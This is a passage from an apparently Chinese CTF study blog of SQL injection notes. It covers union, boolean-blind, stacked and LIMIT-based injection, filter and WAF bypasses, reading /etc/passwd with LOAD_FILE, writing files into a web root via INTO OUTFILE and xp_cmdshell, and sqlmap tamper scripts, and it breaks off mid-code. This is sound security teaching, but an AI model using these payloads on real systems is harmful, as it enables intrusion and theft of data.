MySQL 中，<span class="keyword">PREPARE</span> 和 <span class="keyword">EXECUTE</span> 就是用来执行字符串拼接出来的动态<span class="keyword">SQL</span>语句的机制。</span><br><span class="line"><span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> &quot;SELECT database()&quot;;  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>步骤</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td><code>PREPARE</code> 会把<strong>字符串当作SQL语句</strong>重新编译</td></tr><tr><td>2</td><td><code>EXECUTE</code> 执行编译后的语句</td></tr></tbody></table><h4 id="12-对select的绕过-handler"><a href="#12-对select的绕过-handler" class="headerlink" title="12.对select的绕过(handler):"></a>12.对select的绕过(handler):</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLER 表名 <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] 别名 ];</span><br><span class="line">HANDLER 表名 READ &#123; index_name <span class="operator">|</span> <span class="keyword">PRIMARY</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">FIRST</span> <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="operator">=</span> (key_value1, key_value2, ...) ]</span><br><span class="line">    [ <span class="keyword">WHERE</span> 条件 ]</span><br><span class="line">    [ LIMIT n ];</span><br><span class="line">HANDLER 表名 <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>语法组件</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>OPEN</code></td><td>打开表句柄</td><td><code>HANDLER users OPEN;</code></td></tr><tr><td><code>READ FIRST</code></td><td>读第一行</td><td><code>HANDLER users READ FIRST;</code></td></tr><tr><td><code>READ NEXT</code></td><td>读下一行（游标前进）</td><td><code>HANDLER users READ NEXT;</code></td></tr><tr><td><code>READ PRIMARY = (...)</code></td><td>用主键精确查询</td><td><code>HANDLER users READ PRIMARY = (1);</code></td></tr><tr><td><code>READ index_name = (...)</code></td><td>用指定索引查找</td><td><code>HANDLER users READ idx_name = (&#39;admin&#39;);</code></td></tr><tr><td><code>WHERE</code></td><td>条件过滤（可选）</td><td><code>HANDLER users READ FIRST WHERE id&gt;1;</code></td></tr><tr><td><code>LIMIT</code></td><td>限制读取条数</td><td><code>HANDLER users READ FIRST LIMIT 1;</code></td></tr><tr><td><code>CLOSE</code></td><td>关闭句柄</td><td><code>HANDLER users CLOSE;</code></td></tr></tbody></table><h4 id="13-information-schema的过滤-无列名查询"><a href="#13-information-schema的过滤-无列名查询" class="headerlink" title="13.information.schema的过滤(无列名查询):"></a>13.information.schema的过滤(无列名查询):</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats   <span class="comment">--表名</span></span><br><span class="line">                                                            <span class="comment">---也可以用mysql.innodb_index_stats得到表名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名)a <span class="comment">---a别名，如果``被过滤可以通过as 设置别名</span></span><br></pre></td></tr></table></figure><h4 id="14-sql写入文件"><a href="#14-sql写入文件" class="headerlink" title="14.sql写入文件:"></a>14.sql写入文件:</h4><h5 id="mysql："><a href="#mysql：" class="headerlink" title="mysql："></a>mysql：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;ctfshow&#123;flag_here&#125;&#x27;</span> </span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL:"></a>PostgreSQL:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;ctfshow&#123;flag_here&#125;&#x27;</span>) <span class="keyword">TO</span> <span class="string">&#x27;/tmp/flag.txt&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server:"></a>SQL Server:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ctfshow&#123;pwned&#125; &gt; C:\inetpub\wwwroot\shell.aspx&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="15-读取文件"><a href="#15-读取文件" class="headerlink" title="15.读取文件:"></a>15.读取文件:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="title function_ invoke__">LOAD_FILE</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1.基础用法"></a>1.基础用法</h3><h4 id="1-常见查询关键字"><a href="#1-常见查询关键字" class="headerlink" title="1.常见查询关键字:"></a>1.常见查询关键字:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>  <span class="comment">--字段数探测,查看有多少列</span></span><br></pre></td></tr></table></figure><h4 id="2-常见函数"><a href="#2-常见函数" class="headerlink" title="2.常见函数;"></a>2.常见函数;</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> version()——MySQL版本</span><br><span class="line"><span class="number">2.</span> <span class="keyword">user</span>()——数据库用户名</span><br><span class="line"><span class="number">3.</span> database()——数据库名</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@datadir</span>——数据库路径</span><br><span class="line"><span class="number">5.</span> @<span class="variable">@version_compile_os</span>——操作系统版本</span><br><span class="line"><span class="number">6.</span>concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line"><span class="number">7.</span>concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line"><span class="number">8.</span>group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><h3 id="2-攻击方式-；"><a href="#2-攻击方式-；" class="headerlink" title="2.攻击方式 ；"></a>2.攻击方式 ；</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1.联合注入:"></a>1.联合注入:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span>;————<span class="operator">&gt;</span>爆出表名</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>;<span class="comment">---&gt;爆出字段</span></span><br><span class="line"><span class="keyword">select</span> 所需字段 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 某一个字段 <span class="operator">=</span> <span class="string">&#x27;某值&#x27;</span>       <span class="comment">--爆出某一字段的某一对应值</span></span><br></pre></td></tr></table></figure><h5 id="联合注入常见流程"><a href="#联合注入常见流程" class="headerlink" title="联合注入常见流程:"></a>联合注入常见流程:</h5><table><thead><tr><th>步骤</th><th>SQL语句</th><th>用途说明</th></tr></thead><tbody><tr><td>① 探字段数</td><td><code>&#39; ORDER BY 1--+</code> 到 <code>&#39; ORDER BY n--+</code></td><td>确定能用的列数</td></tr><tr><td>② 拼返回列</td><td>‘ UNION SELECT 1,2,3–+</td><td>替换成真实字段</td></tr><tr><td>③ 查当前库</td><td>UNION SELECT 1,2,database()–+</td><td>爆数据库名</td></tr><tr><td>④ 查表名</td><td>group_concat(table_name) from information_schema.tables where table_schema&#x3D;’xxx’;</td><td>爆所有表</td></tr><tr><td>⑤ 查字段</td><td>group_concat(column_name) from information_schema.columns where table_name&#x3D;’xxx’;</td><td>爆所有字段</td></tr><tr><td>⑥ 查字段值</td><td>select 字段名 from 表名 where 条件</td><td>爆字段内容</td></tr></tbody></table><h5 id="可以直接使用like"><a href="#可以直接使用like" class="headerlink" title="可以直接使用like:"></a>可以直接使用like:</h5><table><thead><tr><th>类型</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>精确匹配</td><td><code>username LIKE &#39;admin&#39;</code></td><td>等价于 <code>=</code>，但可绕过WAF拦截 <code>=</code></td></tr><tr><td>前缀匹配</td><td><code>username LIKE &#39;adm%&#39;</code></td><td>匹配以 <code>adm</code> 开头的内容</td></tr><tr><td>后缀匹配</td><td><code>username LIKE &#39;%min&#39;</code></td><td>匹配以 <code>min</code> 结尾的内容</td></tr><tr><td>中间匹配</td><td><code>username LIKE &#39;%dm%&#39;</code></td><td>匹配包含 <code>dm</code> 的内容</td></tr><tr><td>单字符匹配</td><td><code>username LIKE &#39;a_din&#39;</code></td><td>匹配 <code>a+任意字符+din</code></td></tr><tr><td>任意位置字符匹配</td><td><code>flag LIKE &#39;ctfshow&#123;a________&#125;&#39;</code></td><td>用 <code>_</code> 限定位数、位置盲注</td></tr><tr><td>非空匹配</td><td><code>flag LIKE &#39;%&#39;</code></td><td>判断是否有内容（不为空）</td></tr></tbody></table><h5 id="2-对返回结果的过滤替换-replace"><a href="#2-对返回结果的过滤替换-replace" class="headerlink" title="2.对返回结果的过滤替换(replace):"></a>2.对返回结果的过滤替换(replace):</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str, from_str, to_str)</span><br><span class="line">                <span class="comment">-- str：原始字符串</span></span><br><span class="line">                <span class="comment">-- from_str：要替换的子串</span></span><br><span class="line">                <span class="comment">-- to_str：替换成的新子串</span></span><br><span class="line">REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;nine&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;eight&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;seven&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;six&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;five&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;four&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;three&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;two&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;one&#x27;</span>),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;zero&#x27;</span>) <span class="keyword">from</span> ctfshow_user4 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h5 id="3-如果对返回结果有过滤，也可以将内容写入当前目录的其他的文件"><a href="#3-如果对返回结果有过滤，也可以将内容写入当前目录的其他的文件" class="headerlink" title="3.如果对返回结果有过滤，也可以将内容写入当前目录的其他的文件;"></a>3.如果对返回结果有过滤，也可以将内容写入当前目录的其他的文件;</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select username, password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>flag.txt<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">           --into outfile 将内容写入文件</span></span><br></pre></td></tr></table></figure><h4 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注:"></a>2.布尔盲注:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注是一种盲<span class="keyword">SQL</span>注入攻击方式，利用服务器返回结果的真假条件判断（通常是返回页面的差异）来逐步猜测数据库中的信息。</span><br></pre></td></tr></table></figure><table><thead><tr><th>攻击方法</th><th>攻击Payload示例</th><th>说明</th></tr></thead><tbody><tr><td>条件判断（Condition）</td><td><code>id=1 AND (SELECT COUNT(*) FROM users)&gt;0</code></td><td>根据返回结果真假判断条件是否成立</td></tr><tr><td>字符逐位猜测（逐字符判断）</td><td><code>username=admin&#39; AND substr(password,1,1)=&#39;a&#39; --</code></td><td>逐字符逐步猜测密码</td></tr><tr><td>ASCII范围逐步缩小（折半搜索）</td><td><code>id=1 AND ASCII(substr((SELECT db()),1,1))&gt;97</code></td><td>折半搜索快速确定字符ASCII码</td></tr><tr><td>字符长度判断</td><td><code>id=1 AND LENGTH(database())=8</code></td><td>确认数据库名或数据长度</td></tr><tr><td>猜测数据条数</td><td><code>id=1 AND (SELECT COUNT(*) FROM users)=5</code></td><td>确认表中记录数量</td></tr></tbody></table><h5 id="1-判断方法"><a href="#1-判断方法" class="headerlink" title="1.判断方法:"></a>1.判断方法:</h5><table><thead><tr><th>步骤</th><th>攻击描述</th><th>攻击示例</th></tr></thead><tbody><tr><td>1</td><td>探测注入点，初步判断条件</td><td><code>id=1 AND 1=1</code>(True), <code>id=1 AND 1=2</code>(False)</td></tr><tr><td>2</td><td>判断数据库长度</td><td><code>id=1 AND LENGTH(database())=8</code></td></tr><tr><td>3</td><td>枚举数据库名</td><td><code>id=1 AND substr(database(),1,1)=&#39;c&#39;</code></td></tr><tr><td>4</td><td>枚举数据表</td><td><code>id=1 AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)=&#39;u&#39;</code></td></tr><tr><td>5</td><td>枚举字段、记录数据</td><td><code>id=1 AND substr((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT 0,1),1,1)=&#39;p&#39;</code></td></tr><tr><td>6</td><td>逐字符猜测敏感数据（如用户密码）</td><td><code>id=1 AND substr((SELECT password FROM users LIMIT 0,1),1,1)=&#39;a&#39;</code></td></tr></tbody></table><h4 id="3-堆叠注入"><a href="#3-堆叠注入" class="headerlink" title="3.堆叠注入:"></a>3.堆叠注入:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一条 <span class="keyword">SQL</span> 语句后加 ; 再写另一条语句，一次执行多条 <span class="keyword">SQL</span></span><br></pre></td></tr></table></figure><h5 id="1-row-0"><a href="#1-row-0" class="headerlink" title="1.row(0):"></a>1.row(0):</h5><h6 id="row-0-的真实含义："><a href="#row-0-的真实含义：" class="headerlink" title="$row[0] 的真实含义："></a><code>$row[0]</code> 的真实含义：</h6><ul><li><code>$pdo-&gt;query(...)-&gt;fetch()</code> 默认返回一个数组</li><li>索引方式 <code>$row[0]</code> 表示 <strong>查询结果的第一列值</strong></li></ul><h4 id="4-Mysql下Limit注入方法-ORDER-BY之后"><a href="#4-Mysql下Limit注入方法-ORDER-BY之后" class="headerlink" title="4.Mysql下Limit注入方法(ORDER BY之后)"></a>4.Mysql下Limit注入方法(ORDER BY之后)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果前面，没有<span class="keyword">order</span> <span class="keyword">by</span> 直接通过 <span class="keyword">union</span> 注入</span><br><span class="line">在LIMIT后面可以跟两个函数，<span class="keyword">PROCEDURE</span> 和 <span class="keyword">INTO</span>，<span class="keyword">INTO</span>除非有写入shell的权限，否则是无法利用的</span><br></pre></td></tr></table></figure><h5 id="1-基于报错注入的limit"><a href="#1-基于报错注入的limit" class="headerlink" title="1.基于报错注入的limit:"></a>1.基于报错注入的limit:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br></pre></td></tr></table></figure><h5 id="2-基于时间注入"><a href="#2-基于时间注入" class="headerlink" title="2.基于时间注入;"></a>2.基于时间注入;</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="常见查询用法"><a href="#常见查询用法" class="headerlink" title="常见查询用法"></a>常见查询用法</h2><h3 id="1-查询某张表中名为pass的字段"><a href="#1-查询某张表中名为pass的字段" class="headerlink" title="1.查询某张表中名为pass的字段"></a>1.查询某张表中名为pass的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(pass) <span class="keyword">FROM</span> users;</span><br><span class="line">          这是要查询某张表中名为 pass 的字段有多少条记录</span><br></pre></td></tr></table></figure><table><thead><tr><th>场景</th><th>是否需要 &#96;&#96;&#96;</th><th>理由</th></tr></thead><tbody><tr><td>字段名是保留字（如 <code>user</code>, <code>pass</code>, <code>count</code>）</td><td>✅ 必须</td><td></td></tr><tr><td>保证大小写敏感一致</td><td>✅ 推荐</td><td></td></tr><tr><td>表名&#x2F;字段名中有特殊字符或空格</td><td>✅ 必须</td><td></td></tr><tr><td>想绕过 WAF 过滤字段关键字</td><td>✅ 建议使用</td><td></td></tr><tr><td>普通字段名、表名</td><td>❌ 可选，不强制</td><td></td></tr></tbody></table><h3 id="2-通配符"><a href="#2-通配符" class="headerlink" title="2.通配符:"></a>2.通配符:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> flag&#123;<span class="operator">%</span>   </span><br><span class="line">        <span class="comment">--#是通配符</span></span><br></pre></td></tr></table></figure><h3 id="3-查询文件内容函数"><a href="#3-查询文件内容函数" class="headerlink" title="3.查询文件内容函数:"></a>3.查询文件内容函数:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load_file()     <span class="comment">---查询函数</span></span><br><span class="line">substr()   <span class="comment">--提取函数   --等价于 substring()</span></span><br></pre></td></tr></table></figure><h4 id="load-file-查询函数"><a href="#load-file-查询函数" class="headerlink" title="load_file()查询函数:"></a>load_file()查询函数:</h4><table><thead><tr><th>项目</th><th>内容</th></tr></thead><tbody><tr><td><strong>函数名称</strong></td><td><code>load_file(path)</code></td></tr><tr><td><strong>用途</strong></td><td>从 <strong>MySQL 服务器的文件系统</strong> 中读取指定路径的文件内容</td></tr><tr><td><strong>常见用途</strong></td><td>文件读取漏洞利用（如读取 <code>/etc/passwd</code>、Web 目录源码等）</td></tr><tr><td><strong>返回类型</strong></td><td><code>LONGTEXT</code>（即文本内容）</td></tr><tr><td><strong>典型用法</strong></td><td><code>SELECT load_file(&#39;/etc/passwd&#39;);</code></td></tr><tr><td><strong>前提条件</strong></td><td>MySQL 具有 <code>FILE</code> 权限路径文件存在MySQL 用户对该文件有<strong>读权限</strong>系统未限制 secure_file_priv</td></tr></tbody></table><h4 id="substr-提取函数"><a href="#substr-提取函数" class="headerlink" title="substr()提取函数:"></a>substr()提取函数:</h4><table><thead><tr><th>项目</th><th>内容</th></tr></thead><tbody><tr><td><strong>函数名称</strong></td><td><code>substr(str, pos, len)</code></td></tr><tr><td><strong>用途</strong></td><td>从字符串 <code>str</code> 中提取从 <code>pos</code> 位置开始，长度为 <code>len</code> 的子串</td></tr><tr><td><strong>等价函数</strong></td><td>MySQL 中还有个等价函数叫 <code>substring()</code></td></tr><tr><td><strong>返回值</strong></td><td>字符串的子串</td></tr><tr><td><strong>典型用法</strong></td><td><code>SELECT substr(&#39;flag&#123;12345&#125;&#39;, 6, 1);</code> → 返回 <code>&#39;1&#39;</code></td></tr></tbody></table><h3 id="4-三元表达式"><a href="#4-三元表达式" class="headerlink" title="4.三元表达式;"></a>4.三元表达式;</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr, val_if_true, val_if_false)</span><br></pre></td></tr></table></figure><table><thead><tr><th>部分</th><th>解释</th></tr></thead><tbody><tr><td><code>expr</code></td><td>条件判断表达式（可以是布尔、比较等）</td></tr><tr><td><code>val_if_true</code></td><td>如果条件为 <code>true</code>，返回这个值（这里是 <code>1</code>）</td></tr><tr><td><code>val_if_false</code></td><td>否则返回这个值（这里是 <code>0</code>）</td></tr></tbody></table><h3 id="5-查询当前数据库有几张表-字段"><a href="#5-查询当前数据库有几张表-字段" class="headerlink" title="5.查询当前数据库有几张表(字段):"></a>5.查询当前数据库有几张表(字段):</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询有几张表:</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()</span><br><span class="line"> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()) <span class="operator">=</span> <span class="number">2</span></span><br><span class="line"> 查询第一张表名:</span><br><span class="line"> <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">   substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>, <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> #</span><br><span class="line"> 查询字段个数:</span><br><span class="line"> <span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> </span><br><span class="line"> 查询一个表的字段：</span><br><span class="line"> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"> 爆数据:</span><br><span class="line"> ascii(substr((<span class="keyword">SELECT</span> 列名 <span class="keyword">FROM</span> 表名), N, <span class="number">1</span>))<span class="operator">=</span>X</span><br></pre></td></tr></table></figure><h3 id="6-分页limit的用法"><a href="#6-分页limit的用法" class="headerlink" title="6.分页limit的用法:"></a>6.分页limit的用法:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 是 分页利器，可用于 控制结果数量、定位目标记录、绕过限制爆破。</span><br></pre></td></tr></table></figure><table><thead><tr><th>格式</th><th>功能说明</th></tr></thead><tbody><tr><td><code>LIMIT N</code></td><td>从第一条开始，取 N 条</td></tr><tr><td><code>LIMIT M,N</code></td><td>从第 M+1 条开始，取 N 条</td></tr></tbody></table><table><thead><tr><th>场景类别</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>指定条数</td><td><code>SELECT * FROM users LIMIT 1;</code></td><td>只取一条，适合注入测试</td></tr><tr><td>分页</td><td><code>LIMIT 0,10</code>, <code>LIMIT 10,10</code></td><td>分页抓取用</td></tr><tr><td>指定偏移</td><td><code>LIMIT 999999999,1</code></td><td>盲注中常用做出界探测</td></tr><tr><td>布尔盲注爆破</td><td><code>AND (SELECT ascii(substr(pass,1,1)) FROM users LIMIT 0,1)=97</code></td><td>爆破第一个用户密码第一位</td></tr><tr><td>列表爆破</td><td><code>LIMIT 0,1</code>, <code>LIMIT 1,1</code>, …</td><td>爆破多行数据用循环 LIMIT 爆破</td></tr></tbody></table><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用:"></a>sqlmap的使用:</h2><h3 id="1-tamper的写法"><a href="#1-tamper的写法" class="headerlink" title="1.tamper的写法:"></a>1.tamper的写法:</h3><h4 id="1-基本结构"><a href="#1-基本结构" class="headerlink" title="1.基本结构:"></a>1.基本结构:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#<span class="operator">!</span><span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums import PRIORITY</span><br><span class="line">__priority__ <span class="operator">=</span> PRIORITY.LOW # 当前脚本调用优先等级</span><br><span class="line"></span><br><span class="line">def dependencies(): # 声明当前脚本适用<span class="operator">/</span>不适用的范围，可以为空。 <span class="comment">---作为提示写出</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs): # 用于篡改Payload、以及请求头的主要函数</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-PRIORITY优先级"><a href="#2-PRIORITY优先级" class="headerlink" title="2.PRIORITY优先级:"></a>2.PRIORITY优先级:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:</span><br><span class="line"></span><br><span class="line">LOWEST <span class="operator">=</span> <span class="number">-100</span></span><br><span class="line">LOWER <span class="operator">=</span> <span class="number">-50</span></span><br><span class="line">LOW <span class="operator">=</span> <span class="number">-10</span></span><br><span class="line">NORMAL <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">HIGH <span class="operator">=</span> <span class="number">10</span></span><br><span class="line">HIGHER <span class="operator">=</span> <span class="number">50</span></span><br><span class="line">HIGHEST <span class="operator">=</span> <span class="number">100</span></span><br><span class="line">如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。</span><br></pre></td></tr></table></figure><h4 id="3-基于payload的绕过"><a href="#3-基于payload的绕过" class="headerlink" title="3.基于payload的绕过:"></a>3.基于payload的绕过:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs):</span><br><span class="line">    payload <span class="operator">=</span> payload.<span class="built_in">lower</span>()</span><br><span class="line">    payload <span class="operator">=</span> payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload <span class="operator">=</span> payload.replace(<span class="string">&#x27;union&#x27;</span>,<span 